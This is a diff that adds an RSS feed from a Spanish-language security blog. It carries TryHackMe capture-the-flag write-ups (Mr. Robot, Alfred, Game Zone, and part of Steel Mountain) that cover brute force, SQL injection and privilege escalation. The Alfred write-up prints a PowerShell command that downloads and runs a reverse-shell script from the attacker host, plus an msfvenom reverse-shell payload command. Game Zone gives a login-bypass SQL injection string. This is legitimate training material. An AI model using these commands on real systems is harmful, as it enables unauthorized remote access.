@@ -1,0 +1,451 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Thm on Gabriel Tello</title>
+    <link>https://gtello.github.io/es/tags/thm/</link>
+    <description>Recent content in Thm on Gabriel Tello</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es-EC</language>
+    <managingEditor>gabrieltello10@hotmail.com (Gabriel Tello)</managingEditor>
+    <webMaster>gabrieltello10@hotmail.com (Gabriel Tello)</webMaster>
+    <copyright>[Gabriel Tello](https://github.com/gtello) © 2024</copyright>
+    <lastBuildDate>Mon, 25 Nov 2024 10:32:00 +0000</lastBuildDate>
+    <atom:link href="https://gtello.github.io/es/tags/thm/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Mr. Robot (THM)</title>
+      <link>https://gtello.github.io/es/writeups/mrrobot/</link>
+      <pubDate>Mon, 25 Nov 2024 10:32:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
+      <guid>https://gtello.github.io/es/writeups/mrrobot/</guid>
+      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;  &#xD;&#xA;&lt;p&gt;Writeup de la máquina &lt;a href=&#34;https://tryhackme.com/r/room/mrrobot&#34;&gt;Mr. Robot&lt;/a&gt; en TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Este writeup detalla la explotación de la máquina Mr. Robot. Incluye el reconocimiento para descubrir directorios ocultos, fuerza bruta de credenciales para WordPress, ejecución de una reverse shell y escalada de privilegios hasta &lt;code&gt;root&lt;/code&gt;. Se emplearon herramientas como &lt;em&gt;nmap&lt;/em&gt;, &lt;em&gt;wfuzz&lt;/em&gt;, &lt;em&gt;Burp Suite&lt;/em&gt;, &lt;em&gt;Hydra&lt;/em&gt;, &lt;em&gt;WPScan&lt;/em&gt; y &lt;em&gt;LINpeas.sh&lt;/em&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&#xD;&#xA;  &lt;p class=&#34;alert-title&#34;&gt;&#xD;&#xA;    &lt;span class=&#34;alert-icon alert-note-icon&#34;&gt;&#xD;&#xA;      &lt;svg class=&#34;octicon&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&#xD;&#xA;        &lt;path d=&#34;M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z&#34;&gt;&lt;/path&gt;&#xD;&#xA;      &lt;/svg&gt;&#xD;&#xA;      Note&#xD;&#xA;    &lt;/span&gt;&#xD;&#xA;  &lt;/p&gt;</description>
+      <content:encoded><![CDATA[<div style="text-align: justify;">  
+<p>Writeup de la máquina <a href="https://tryhackme.com/r/room/mrrobot">Mr. Robot</a> en TryHackMe.</p>
+<h2 id="resumen">Resumen</h2>
+<p>Este writeup detalla la explotación de la máquina Mr. Robot. Incluye el reconocimiento para descubrir directorios ocultos, fuerza bruta de credenciales para WordPress, ejecución de una reverse shell y escalada de privilegios hasta <code>root</code>. Se emplearon herramientas como <em>nmap</em>, <em>wfuzz</em>, <em>Burp Suite</em>, <em>Hydra</em>, <em>WPScan</em> y <em>LINpeas.sh</em>.</p>
+<div class="alert alert-note">
+  <p class="alert-title">
+    <span class="alert-icon alert-note-icon">
+      <svg class="octicon" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true">
+        <path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path>
+      </svg>
+      Note
+    </span>
+  </p>
+  <p class="alert-text">Este tutorial está basado en una versión modificada de la máquina CTF Mr. Robot, alojada en TryHackMe. Aunque la metodología para rootear esta máquina se alinea con la original, algunos flags y detalles específicos han sido alterados.</p>
+</div>
+
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>El proceso comenzó con un escaneo de red para identificar puertos y servicios abiertos.</p>
+<p><img alt="Resultados de Rustscan" src="/images/posts/mrrobot/image1.png"> <center><b>Resultados de Rustscan</b></center></p>
+<h3 id="resultados-del-reconocimiento">Resultados del Reconocimiento</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Sistema Operativo</th>
+          <th style="text-align: left">Dirección IP</th>
+          <th style="text-align: left">Puertos Abiertos</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">Linux</td>
+          <td style="text-align: left">192.168.2.114</td>
+          <td style="text-align: left">80 (HTTP), 443 (HTTPS)</td>
+      </tr>
+  </tbody>
+</table>
+<p>Al visitar el servidor web, la página de inicio hacía referencia al programa de TV <em>Mr. Robot</em>. Se descubrió un directorio oculto <code>/robots</code> usando <strong>wfuzz</strong>, que contenía un archivo de diccionario y el primer flag.</p>
+<p><img alt="Contenido de Robots.txt" src="/images/posts/mrrobot/image4.png"> <center><b>Contenido de /robots</b></center></p>
+<h2 id="explotación">Explotación</h2>
+<p>Con evidencia de que el sistema usaba WordPress como CMS, lanzamos un ataque de fuerza bruta en el portal de inicio de sesión.</p>
+<h3 id="inicio-de-sesión-en-wordpress">Inicio de Sesión en WordPress</h3>
+<p>Las credenciales fueron obtenidas usando <strong>Burp Suite</strong> para capturar la solicitud de inicio de sesión y <strong>Hydra</strong> para realizar fuerza bruta sobre la cuenta de administrador utilizando el archivo de diccionario descubierto.</p>
+<p><img alt="Solicitud capturada en Burp Suite" src="/images/posts/mrrobot/image5.png"> <center><b>Captura de solicitud en Burp Suite</b></center><br>
+<img alt="Ejecución de Hydra" src="/images/posts/mrrobot/image6.png"> <center><b>Fuerza bruta de login con Hydra</b></center></p>
+<p>Con el usuario &ldquo;Angela&rdquo; y la contraseña descubierta, obtuvimos acceso al panel de administración de WordPress. Desde allí, reemplazamos un archivo de plantilla PHP con una reverse shell, permitiendo acceso remoto.</p>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<p>Una vez ejecutada la payload, establecimos una shell como el usuario <code>daemon</code>.</p>
+<p><img alt="Conexión de reverse shell" src="/images/posts/mrrobot/image9.png"> <center><b>Conexión de reverse shell</b></center></p>
+<p>Al explorar el sistema de archivos, encontramos una contraseña cifrada en el directorio <code>/home/robot</code>. Este hash fue descifrado usando <a href="https://crackstation.net/">Crackstation</a>, resultando en la contraseña <code>sayajin23</code>. Con esta contraseña, obtuvimos acceso al usuario <code>robot</code>.</p>
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+<p>La escalada de privilegios se logró utilizando <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LINpeas.sh</a> para identificar configuraciones incorrectas.</p>
+<h3 id="explotación-de-nmap">Explotación de nmap</h3>
+<p>LINpeas resaltó que <code>nmap</code> tenía privilegios elevados. Usando <a href="https://gtfobins.github.io/gtfobins/nmap/">GTFObins</a>, construimos un comando para explotar el modo interactivo de <code>nmap</code> y escalar a root.</p>
+<p><img alt="Escalada de privilegios" src="/images/posts/mrrobot/image14.png"> <center><b>Usando nmap para escalada de privilegios</b></center></p>
+<p>Después de ejecutar los comandos exitosamente, obtuvimos acceso a la máquina como usuario root.</p>
+<h2 id="flags">Flags</h2>
+<p>Se encontraron tres flags durante la explotación:</p>
+<ul>
+<li><strong>Flag 1:</strong> b8a2bd7f70b405df8823bd4442892c6c</li>
+<li><strong>Flag 2:</strong> c6ad356a6d4ab0c2c9d033caadf28469</li>
+<li><strong>Flag 3:</strong> 6c6b1c7089af9c9bb7ac78f06c3c1685</li>
+</ul>
+<h2 id="herramientas-utilizadas">Herramientas Utilizadas</h2>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Herramienta</th>
+          <th style="text-align: left">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>Rustscan</strong></td>
+          <td style="text-align: left">Escaneo rápido de puertos para identificar servicios activos.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>wfuzz</strong></td>
+          <td style="text-align: left">Fuerza bruta en directorios para descubrir rutas ocultas.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>Burp Suite</strong></td>
+          <td style="text-align: left">Intercepción de solicitudes HTTP para análisis y pruebas.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>Hydra</strong></td>
+          <td style="text-align: left">Fuerza bruta de inicio de sesión en WordPress.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>WPScan</strong></td>
+          <td style="text-align: left">Enumeración de usuarios y vulnerabilidades en WordPress.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>LINpeas.sh</strong></td>
+          <td style="text-align: left">Script de enumeración para escalada de privilegios.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>GTFObins</strong></td>
+          <td style="text-align: left">Explotación de <code>nmap</code> para escalada de privilegios.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="recomendaciones">Recomendaciones</h2>
+<ul>
+<li><strong>Proteger archivos sensibles</strong>: Evitar exponer rutas críticas en <code>robots.txt</code> que conduzcan a recursos sensibles.</li>
+<li><strong>Implementar contraseñas robustas</strong>: Utilizar contraseñas complejas y monitorizar intentos de fuerza bruta.</li>
+<li><strong>Restringir binarios privilegiados</strong>: Limitar el acceso a binarios como <code>nmap</code> que puedan ser explotados para escalada de privilegios.</li>
+<li><strong>Actualizar y asegurar WordPress</strong>: Mantener WordPress, plugins y temas actualizados, restringiendo el acceso al panel de administración.</li>
+<li><strong>Realizar auditorías de seguridad</strong>: Auditar sistemas regularmente con herramientas como <strong>LINpeas</strong> para identificar y mitigar vulnerabilidades.</li>
+</ul>
+</div>]]></content:encoded>
+    </item>
+    <item>
+      <title>Alfred (THM)</title>
+      <link>https://gtello.github.io/es/writeups/alfred/</link>
+      <pubDate>Fri, 15 Nov 2024 15:30:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
+      <guid>https://gtello.github.io/es/writeups/alfred/</guid>
+      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup de la máquina &lt;a href=&#34;https://tryhackme.com/r/room/alfred&#34;&gt;Alfred&lt;/a&gt; en TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Vamos a ver cómo explotar una máquina Windows con un servicio Jenkins expuesto. Usando credenciales por defecto, logramos ejecutar comandos remotos a través de la funcionalidad de construcción de Jenkins y obtenimos un acceso inicial. A partir de ahí, escalamos privilegios utilizando técnicas de suplantación de tokens, alcanzando finalmente control administrativo total del sistema.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;&#xA;&lt;p&gt;Lo primero fue realizar un escaneo de red con &lt;code&gt;nmap&lt;/code&gt; para identificar puertos y servicios abiertos.&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<div style="text-align: justify;">
+<p>Writeup de la máquina <a href="https://tryhackme.com/r/room/alfred">Alfred</a> en TryHackMe.</p>
+<h2 id="resumen">Resumen</h2>
+<p>Vamos a ver cómo explotar una máquina Windows con un servicio Jenkins expuesto. Usando credenciales por defecto, logramos ejecutar comandos remotos a través de la funcionalidad de construcción de Jenkins y obtenimos un acceso inicial. A partir de ahí, escalamos privilegios utilizando técnicas de suplantación de tokens, alcanzando finalmente control administrativo total del sistema.</p>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Lo primero fue realizar un escaneo de red con <code>nmap</code> para identificar puertos y servicios abiertos.</p>
+<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Sistema Operativo</th>
+          <th style="text-align: left">Dirección IP</th>
+          <th style="text-align: left">Puertos Abiertos</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">Windows Server</td>
+          <td style="text-align: left">10.10.149.26</td>
+          <td style="text-align: left">80, 3389, 8080</td>
+      </tr>
+  </tbody>
+</table>
+<p><img alt="Comando nmap y resultados" src="/images/posts/alfred/image1.png"></p>
+<center><b>Comando nmap y resultados</b></center>
+<p>Los puertos 80 y 8080 fueron analizados en el navegador. En el puerto 8080, encontré un portal de inicio de sesión de Jenkins, una herramienta ampliamente usada para CI/CD.</p>
+<h2 id="explotación">Explotación</h2>
+<p>Probé credenciales por defecto (<code>admin:admin</code>) en el portal de Jenkins, y sorpresa: funcionaron. Esto me dio acceso al dashboard.</p>
+<p><img alt="Dashboard de Jenkins" src="/images/posts/alfred/image2.png"></p>
+<center><b>Dashboard de Jenkins</b></center>
+<p>En la configuración del proyecto, utilicé la sección &ldquo;Build&rdquo; para ejecutar comandos. Usé este <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">script</a> de PowerShell para establecer una reverse shell:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.6.5.62:8008/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">10.6</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">62</span> <span class="n">-Port</span> <span class="mf">4321</span></span></span></code></pre></div><p>Con la opción <strong>Build Now</strong>, conseguí conectarme exitosamente a la máquina objetivo desde mi terminal atacante.</p>
+<p><img alt="Comando de reverse shell en Jenkins" src="/images/posts/alfred/image3.png"></p>
+<center><b>Comando de reverse shell en Jenkins</b></center>  
+<p><img alt="Acceso mediante reverse shell" src="/images/posts/alfred/image4.png"></p>
+<center><b>Acceso mediante reverse shell</b></center>
+<h2 id="escalación-de-privilegios">Escalación de Privilegios</h2>
+<p>Una vez dentro de la máquina, generé un payload ejecutable para obtener una sesión de <code>meterpreter</code> utilizando <code>msfvenom</code>:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o revshell.exe</span></span></code></pre></div><p>Transferí el payload a la máquina objetivo utilizando <code>certutil</code> y lo ejecuté, estableciendo una conexión <code>meterpreter</code> con mi máquina atacante.</p>
+<p><img alt="Configuración del receptor en Metasploit" src="/images/posts/alfred/image5.png"></p>
+<center><b>Configuración del receptor en Metasploit</b></center>
+<p>Revisando los privilegios del usuario, podemos ver que tenemos los permisos <code>SeDebugPrivilege</code> y <code>SeImpersonatePrivilege</code>. Estos permisos permiten suplantar tokens y acceder a procesos con permisos elevados. Utilicé el módulo <code>incognito</code> de Metasploit para explotarlos.</p>
+<p><img alt="Uso del módulo incognito" src="/images/posts/alfred/image6.png"></p>
+<center><b>Uso del módulo incognito</b></center>
+<p>Finalmente, migré el proceso a un servicio con permisos <code>SYSTEM</code>, logrando control completo sobre la máquina.</p>
+<p><img alt="Migración a un proceso privilegiado" src="/images/posts/alfred/image7.png"></p>
+<center><b>Migración a un proceso privilegiado</b></center>
+<h2 id="banderas">Banderas</h2>
+<p>Con acceso administrativo, encontré las banderas:</p>
+<ul>
+<li><strong>user.txt</strong>: <code>79007a09481963edf2e1321abd9ae2a0</code></li>
+<li><strong>root.txt</strong>: <code>dff0f748678f280250f25a45b8046b4a</code></li>
+</ul>
+<h2 id="herramientas-utilizadas">Herramientas Utilizadas</h2>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Herramienta</th>
+          <th style="text-align: left">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>nmap</strong></td>
+          <td style="text-align: left">Escaneo de red y detección de servicios abiertos.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>Jenkins</strong></td>
+          <td style="text-align: left">Plataforma explotada con credenciales por defecto para ejecutar comandos.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>msfvenom/metasploit</strong></td>
+          <td style="text-align: left">Generación de payloads y escalación de privilegios con el módulo incognito.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>certutil</strong></td>
+          <td style="text-align: left">Transferencia del payload a la máquina objetivo.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="conclusión">Conclusión</h2>
+<p>La explotación del sistema Alfred reveló problemas críticos como servicios expuestos con credenciales por defecto y configuraciones incorrectas de privilegios, lo que permitió escalar hasta el nivel de administrador.</p>
+<h2 id="recomendaciones">Recomendaciones</h2>
+<ul>
+<li><strong>Actualizar Jenkins</strong> y eliminar credenciales por defecto.</li>
+<li>Configurar un <strong>firewall</strong> para restringir accesos innecesarios.</li>
+<li>Implementar políticas de contraseñas robustas.</li>
+<li>Limitar privilegios innecesarios en los usuarios.</li>
+</ul>
+</div>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Game Zone (THM)</title>
+      <link>https://gtello.github.io/es/writeups/gamezone/</link>
+      <pubDate>Thu, 14 Nov 2024 20:43:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
+      <guid>https://gtello.github.io/es/writeups/gamezone/</guid>
+      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup de la máquina &lt;a href=&#34;https://tryhackme.com/r/room/gamezone&#34;&gt;Game Zone&lt;/a&gt; de TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Este writeup cubre la intrusión en un entorno web vulnerable, la obtención de acceso mediante SQL Injection, y la escalación de privilegios a root utilizando un exploit de Webmin. Incluye técnicas de recolección de datos, cracking de hashes y uso de herramientas como &lt;em&gt;nmap&lt;/em&gt;, &lt;em&gt;Burp Suite&lt;/em&gt;, &lt;em&gt;sqlmap&lt;/em&gt;, y &lt;em&gt;John the Ripper&lt;/em&gt;.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;&#xA;&lt;p&gt;El primer paso fue un escaneo de red con nmap para descubrir puertos y servicios activos.&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<div style="text-align: justify;">
+<p>Writeup de la máquina <a href="https://tryhackme.com/r/room/gamezone">Game Zone</a> de TryHackMe.</p>
+<h2 id="resumen">Resumen</h2>
+<p>Este writeup cubre la intrusión en un entorno web vulnerable, la obtención de acceso mediante SQL Injection, y la escalación de privilegios a root utilizando un exploit de Webmin. Incluye técnicas de recolección de datos, cracking de hashes y uso de herramientas como <em>nmap</em>, <em>Burp Suite</em>, <em>sqlmap</em>, y <em>John the Ripper</em>.</p>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>El primer paso fue un escaneo de red con nmap para descubrir puertos y servicios activos.</p>
+<p><img alt="Resultado nmap" src="/images/posts/gamezone/image1.png"> <center><b>Comando nmap y resultados</b></center></p>
+<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Sistema Operativo</th>
+          <th style="text-align: left">Dirección IP</th>
+          <th style="text-align: left">Puertos Abiertos</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">Ubuntu 16.04.6</td>
+          <td style="text-align: left">10.10.254.53</td>
+          <td style="text-align: left">22 (SSH), 80 (HTTP)</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="explotación">Explotación</h2>
+<p>Al encontrar el puerto 80 abierto, accedimos a la página de inicio de Game Zone desde el navegador.</p>
+<p><img alt="Página de inicio de Game Zone" src="/images/posts/gamezone/image2.png"> <center><b>Página de inicio de Game Zone</b></center></p>
+<p>El cuarto en TryHackMe invitaba a probar SQL Injection (SQLi) en el campo de login. Usando la sentencia <code>' or 1=1 limit 1;#</code> en el campo de usuario y dejando la contraseña en blanco, logramos autenticarnos exitosamente al portal. Sin embargo, al probar más inyecciones manualmente, no tuvimos resultados adicionales, así que decidimos capturar el <strong>POST request</strong> de la búsqueda con <strong>Burp Suite</strong> para con eso automatizar pruebas de SQLi con <strong>SQLmap</strong>.</p>
+<p><img alt="Captura de POST request" src="/images/posts/gamezone/image3.png"> <center><b>Captura de POST request</b></center></p>
+<p>Utilizamos el comando <code>sqlmap -r POST.txt --dump</code> para verificar y explotar vulnerabilidades de inyección SQL. SQLmap reveló la presencia de una base de datos MySQL y mostró el contenido de la tabla de <code>users</code> con contraseñas hasheadas. Aplicamos <strong>John the Ripper</strong> para descifrar el hash de la contraseña del usuario <code>agent47</code>.</p>
+<p><img alt="Ejecución de SQLmap" src="/images/posts/gamezone/image4.png"> <center><b>Ejecución de SQLmap</b></center><br>
+<img alt="Crack del hash" src="/images/posts/gamezone/image5.png"> <center><b>Crack del hash</b></center></p>
+<p>Con las credenciales, logramos acceder a la máquina vía SSH.</p>
+<p><img alt="Ingreso mediante ssh" src="/images/posts/gamezone/image6.png"> <center><b>Ingreso mediante ssh</b></center></p>
+<h3 id="escalación-de-privilegios">Escalación de Privilegios</h3>
+<p>Dentro de la máquina, ejecutamos <code>ss -tulpn</code> para identificar puertos y servicios adicionales. Observamos que el puerto 10000 estaba bloqueado por un firewall, así que configuramos un túnel SSH con <code>ssh -L 10000:127.0.0.1:10000 agent47@10.10.254.53</code>. Esto nos permitió acceder a un CMS llamado <strong>Webmin</strong>, versión 1.580.</p>
+<p><img alt="Puerto 10000 bloqueado por firewall" src="/images/posts/gamezone/image7.png"> <center><b>Puerto 10000 bloqueado por firewall</b></center><br>
+<img alt="Portal Webmin" src="/images/posts/gamezone/image8.png"> <center><b>Portal Webmin</b></center></p>
+<p>Investigando posibles vulnerabilidades en Webmin, encontramos el exploit <a href="https://github.com/JohnHammond/CVE-2012-2982">CVE-2012-2982</a>. Al ejecutar este exploit, conseguimos acceso root en la máquina.</p>
+<p><img alt="Uso de exploit" src="/images/posts/gamezone/image9.png"> <center><b>Uso de exploit</b></center><br>
+<img alt="Acceso a usuario root" src="/images/posts/gamezone/image10.png"> <center><b>Acceso a usuario root</b></center></p>
+<h2 id="banderas">Banderas</h2>
+<p>Ya con privilegios de root, localizamos las dos banderas:</p>
+<ul>
+<li><code>user.txt</code>: 649ac17b1480ac13ef1e4fa579dac95c</li>
+<li><code>root.txt</code>: a4b945830144bdd71908d12d902adeee</li>
+</ul>
+<h2 id="herramientas-utilizadas">Herramientas Utilizadas</h2>
+<p>Durante este análisis, empleamos las siguientes herramientas:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Herramienta</th>
+          <th style="text-align: left">Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>nmap</strong></td>
+          <td style="text-align: left">Escaneo de red y detección de puertos abiertos.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>Burp Suite</strong></td>
+          <td style="text-align: left">Captura y análisis de solicitudes HTTP para SQLi automatizado.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>sqlmap</strong></td>
+          <td style="text-align: left">Pruebas de SQLi y extracción de datos de la base de datos.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>John the Ripper</strong></td>
+          <td style="text-align: left">Descifrado del hash de la contraseña del usuario <code>agent47</code> para acceso SSH.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>Exploit CVE-2012-2982</strong></td>
+          <td style="text-align: left">Vulnerabilidad en Webmin que permitió escalación de privilegios a root.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="recomendaciones">Recomendaciones</h2>
+<ul>
+<li><strong>Actualización de sistemas y aplicaciones críticas</strong>, especialmente Webmin y Ubuntu, para corregir vulnerabilidades conocidas.</li>
+<li><strong>Restricciones de firewall</strong> en servicios internos y <strong>sanitización de inputs</strong> para prevenir inyecciones SQL.</li>
+<li>Implementar un sistema de <strong>gestión de parches</strong> y fomentar el uso de <strong>contraseñas seguras</strong> para reducir el riesgo de escalación de privilegios.</li>
+</ul>
+</div>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Steel Mountain (THM)</title>
+      <link>https://gtello.github.io/es/writeups/steelmountain/</link>
+      <pubDate>Tue, 12 Nov 2024 22:40:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
+      <guid>https://gtello.github.io/es/writeups/steelmountain/</guid>
+      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup de la máquina &lt;a href=&#34;https://www.tryhackme.com/room/steelmountain&#34;&gt;Steel Mountain&lt;/a&gt; de TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Encontramos varias vulnerabilidades que nos permitieron obtener acceso no autorizado al sistema. Primero, encontramos servicios en los puertos 80 y 8080 que exponían información sensible. Luego, usando un exploit en uno de estos servicios, conseguimos acceso al sistema con una reverse shell.&lt;/p&gt;&#xA;&lt;p&gt;Después, escalamos privilegios y logramos permisos de administrador gracias a una mala configuración de permisos en uno de los servicios del sistema, lo cual nos dio acceso a archivos críticos y nos permitió llegar hasta información confidencial.&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<div style="text-align: justify;">
+<p>Writeup de la máquina <a href="https://www.tryhackme.com/room/steelmountain">Steel Mountain</a> de TryHackMe.</p>
+<h2 id="resumen">Resumen</h2>
+<p>Encontramos varias vulnerabilidades que nos permitieron obtener acceso no autorizado al sistema. Primero, encontramos servicios en los puertos 80 y 8080 que exponían información sensible. Luego, usando un exploit en uno de estos servicios, conseguimos acceso al sistema con una reverse shell.</p>
+<p>Después, escalamos privilegios y logramos permisos de administrador gracias a una mala configuración de permisos en uno de los servicios del sistema, lo cual nos dio acceso a archivos críticos y nos permitió llegar hasta información confidencial.</p>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Empezamos con un escaneo de red con nmap para ver qué puertos estaban abiertos y qué servicios corrían en ellos.</p>
+<div>
+  <img src="/images/posts/steelmountain/image1.png" alt="Resultado nmap" />
+</div>
+<center><em>Figura 1:</em> Resultado nmap</center>
+<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Sistema Operativo</th>
+          <th style="text-align: left">Dirección IP</th>
+          <th style="text-align: left">Puertos Abiertos</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">Windows Server 2008</td>
+          <td style="text-align: left">10.10.128.109</td>
+          <td style="text-align: left">80 (HTTP), 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP), 8080 (HTTP-Alternate), 47001 (WinRM HTTPS), and 49152-49164 (Dynamic RPC range)</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="explotación">Explotación</h2>
+<p>Al investigar el puerto 80 en el navegador, encontramos la página de inicio de Steel Mountain con un &ldquo;Empleado del Mes&rdquo; llamado Bill Harper (nombre tomado del archivo de la imagen). En el puerto 8080, descubrimos un servidor Rejetto HTTP que estaba expuesto y vulnerable a un exploit de ejecución remota de comandos (Remote Command Execution) en la versión 2.3.x de HFS. Usamos metasploit para lanzar el exploit y obtener una conexión reverse shell en el servidor. En el escritorio del usuario se encuentra la primera bandera.</p>
+<div style="text-align: center;">
+  <img width="1000" src="/images/posts/steelmountain/image2.png" alt="steelmountain" />
+</div>
+<center><em>Figura 2:</em> Homepage de Steel Mountain</center>
+<br>
+<div style="text-align: center;">
+  <img src="/images/posts/steelmountain/image3.png" alt="hfs http file server" />
+</div>
+<center><em>Figura 3:</em> Servidor Rejetto HTTP expuesto</center>
+<br>
+<div style="text-align: center;">
+  <img src="/images/posts/steelmountain/image4.png" alt="shell metasploit" />
+</div>
+<center><em>Figura 4:</em> Shell obtenido en metasploit</center>
+<h2 id="escalación-de-privilegios">Escalación de privilegios</h2>
+<p>Con acceso inicial al sistema, ejecutamos el script <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp.ps1</a> en PowerShell para buscar posibles problemas de configuración en el sistema Windows. El script detectó que el servicio <code>AdvancedSystemCareService9</code> tenía configuraciones de permisos mal configuradas:</p>
+<ul>
+<li>La ruta del servicio no tenía comillas y tenía espacios, lo que es vulnerable en Windows.</li>
